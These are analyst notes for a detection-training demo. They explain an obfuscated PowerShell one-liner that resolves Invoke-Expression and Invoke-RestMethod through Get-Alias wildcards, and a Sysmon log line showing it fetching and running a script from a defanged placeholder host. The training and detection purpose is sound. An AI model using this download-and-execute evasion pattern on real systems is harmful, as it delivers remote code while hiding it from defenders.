# Analyst notes — `01-wildcard-getalias-iex.log`

**Do not reveal until after the room has had a chance to read the raw log and
guess the pattern.** Paired live-demo raw log: `01-wildcard-getalias-iex.log`.
Sigma rule this maps to: `../sigma-rules/sigma-t1027010-wildcard-alias-iex.yml`.

```
.(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')
```

- `gal` is the built-in alias for `Get-Alias`. `?e[?x]` is a wildcard pattern
  (`?` = any single char) that resolves to the alias "iex" without the string
  "iex" or "Invoke-Expression" ever appearing literally in the command.
- The inner `(gal ?rm)` performs the same trick against the alias "irm"
  (Invoke-RestMethod), so the retrieval cmdlet is also never typed.
- The leading `.` is PowerShell's dot-source/call-adjacent invocation used
  here to execute the alias-resolved command against the result of the
  inner wildcard-resolved retrieval call — net effect:
  `Invoke-Expression (Invoke-RestMethod 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')`
  with neither cmdlet name present as a literal string anywhere on disk,
  on the wire, or in a naive process-command-line regex.
- This is the exact wrapper shape documented from STEEP#MAVERICK
  (Securonix Threat Labs) and cited as motivating evidence for MITRE
  ATT&CK T1027.010, reconstructed here with a placeholder destination for
  training/demo use.

Correlated Sysmon Event ID 1 (same ProcessId, ~90ms earlier — see
`guides/04-telemetry-detection-guide.md` Section 4.2 for the full triple):
```
CommandLine: "powershell.exe" -NoP -W Hidden -Exec Bypass -Command ".(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')"
ParentImage: C:\Users\j.alvarez\AppData\Local\Temp\Invoice_ref88213.exe
```

Used by: `guides/04-telemetry-detection-guide.md` Section 4.2 (live demo asset).
